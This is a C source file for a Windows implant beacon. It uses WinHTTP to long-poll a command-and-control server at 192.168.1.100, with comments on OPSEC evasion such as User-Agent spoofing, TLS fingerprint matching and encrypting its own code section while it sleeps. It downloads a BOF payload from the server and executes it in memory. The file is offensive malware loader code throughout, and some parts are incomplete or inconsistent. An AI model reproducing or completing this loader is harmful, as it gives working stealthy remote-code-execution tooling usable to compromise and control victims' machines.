#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

// -----------------------------------------------------------------------------
// FORWARD DECLARATIONS
// -----------------------------------------------------------------------------
__declspec(code_seg(".stub")) 
void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength);

__declspec(code_seg(".stub"))
void LockAndHibernate();

__declspec(code_seg(".stub"))
void UnlockAndExecute(LPVOID pBofBuffer, DWORD dwBofSize); // We will define this later

// -----------------------------------------------------------------------------
// ASYNC BEACON PRIMITIVE
// -----------------------------------------------------------------------------
BOOL StartAsyncBeacon(PHTTP_CONTEXT pCtx) {
    if (!pCtx) return FALSE;

    // 1. Session Initialization
    // OPSEC: Match a specific, modern User-Agent exactly.
    pCtx->hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
                                 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                 WINHTTP_NO_PROXY_NAME, 
                                 WINHTTP_NO_PROXY_BYPASS, 
                                 WINHTTP_FLAG_ASYNC); // Asynchronous I/O via Kernel IOCP
    if (!pCtx->hSession) return FALSE;

    // 2. OPSEC: TLS Pinning / Fingerprint adjustment
    // Force TLS 1.2 and 1.3 to avoid downgrade attacks and match modern JA3 fingerprints.
    DWORD dwTlsOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(pCtx->hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwTlsOptions, sizeof(dwTlsOptions));

    // 3. Register the IOCP callback
    WinHttpSetStatusCallback(pCtx->hSession, 
                             (WINHTTP_STATUS_CALLBACK)IocpWakeupCallback, 
                             WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS, 
                             0);

    // 4. Connect to C2 (Use 443 for HTTPS)
    pCtx->hConnect = WinHttpConnect(pCtx->hSession, L"192.168.1.100", 443, 0);
    if (!pCtx->hConnect) goto Cleanup;

    // 5. Open Request
    // OPSEC: WINHTTP_FLAG_SECURE is mandatory for HTTPS.
    pCtx->hRequest = WinHttpOpenRequest(pCtx->hConnect, L"GET", L"/api/v1/poll", 
                                        NULL, WINHTTP_NO_REFERER, 
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                        WINHTTP_FLAG_SECURE);
    if (!pCtx->hRequest) goto Cleanup;

    // 6. OS-Level Long Polling Configuration
    // Parameters: Resolve (0=default), Connect (60s), Send (30s), Receive (INFINITE)
    // The kernel will hold the TCP socket in ESTABLISHED state indefinitely while waiting for the C2 PSH flag.
    WinHttpSetTimeouts(pCtx->hRequest, 0, 60000, 30000, INFINITE);

    // 7. Send Request
    // CRITICAL: We pass pCtx as the 5th parameter (dwContext). 
    // The kernel attaches this pointer to the I/O Completion Packet.
    BOOL bResult = WinHttpSendRequest(pCtx->hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, (DWORD_PTR)pCtx);
    
    if (bResult) return TRUE;

Cleanup:
    // Close handles on immediate failure to prevent handle leaks in the PEB.
    if (pCtx->hRequest) WinHttpCloseHandle(pCtx->hRequest);
    if (pCtx->hConnect) WinHttpCloseHandle(pCtx->hConnect);
    if (pCtx->hSession) WinHttpCloseHandle(pCtx->hSession);
    return FALSE;
}

// -----------------------------------------------------------------------------
// MAIN ENTRY POINT (.text section - will be encrypted)
// -----------------------------------------------------------------------------
int main() {
    // 1. Launch the async network primitive.
    // The OS takes over C2 communication from here.
    if (!StartAsyncBeacon()) {
        // Exit stealthily if the network initialization fails.
        return -1; 
    }

    // 2. The request is in flight. The C2 will respond.
    // We do not wait here! We transfer execution to the .stub section.
    // This function will encrypt the .text section and kill this main thread.
    LockAndHibernate();

    // 3. Unreachable code.
    // The main thread is dead. The process is sleeping, managed solely by Kernel IOCP.
    return 0;
}

// -----------------------------------------------------------------------------
// THE WATCHMAN (.stub section - remains unencrypted / RX)
// -----------------------------------------------------------------------------
__declspec(code_seg(".stub")) 
void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
    
    // We use a static or context-passed buffer to accumulate the BOF payload
    // across multiple asynchronous read operations.
    static LPVOID pDownloadBuffer = NULL; 
    static DWORD dwTotalDownloaded = 0;
    DWORD dwBytesAvailable = 0;

    // The WinHTTP Event State Machine
    switch (dwInternetStatus) {

        case WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE:
            // The request was successfully sent to the C2.
            // We now instruct the kernel to wait for the HTTP response headers.
            WinHttpReceiveResponse(hInternet, NULL);
            break;

        case WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE:
            // The server responded and headers are parsed.
            // We ask the kernel how much data (payload) is currently available to read.
            WinHttpQueryDataAvailable(hInternet, NULL);
            break;

        case WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE:
            // The kernel tells us how many bytes are ready to be read.
            dwBytesAvailable = *((LPDWORD)lpvStatusInformation);

            if (dwBytesAvailable == 0) {
                // No more data available. The download is complete!
                // The BOF is fully in our buffer. 
                // Now, we must decrypt the .text section and execute the payload.
                UnlockAndExecute(pDownloadBuffer, dwTotalDownloaded);
                
                // Cleanup HTTP handles here...
                WinHttpCloseHandle(hInternet);
            } else {
                // Data is available. Allocate or resize our buffer.
                // In a real S-tier scenario, avoid basic malloc (MEM_PRIVATE footprint).
                // Use a pre-allocated region or a custom memory manager.
                if (!pDownloadBuffer) {
                    pDownloadBuffer = VirtualAlloc(NULL, dwBytesAvailable, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                } else {
                    // Reallocation logic goes here... (simplified for the snippet)
                }

                // Instruct the kernel to read the data chunk asynchronously into our buffer.
                WinHttpReadData(hInternet, (LPBYTE)pDownloadBuffer + dwTotalDownloaded, dwBytesAvailable, NULL);
            }
            break;

        case WINHTTP_CALLBACK_STATUS_READ_COMPLETE:
            // A chunk of data has been successfully written to our buffer.
            dwTotalDownloaded += dwStatusInformationLength;

            // Ask the kernel if there is more data remaining in the socket stream.
            // This loops back to WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE.
            WinHttpQueryDataAvailable(hInternet, NULL);
            break;
            
        case WINHTTP_CALLBACK_STATUS_REQUEST_ERROR:
            // Handle network timeouts, connection drops, etc.
            WinHttpCloseHandle(hInternet);
            break;
    }
}
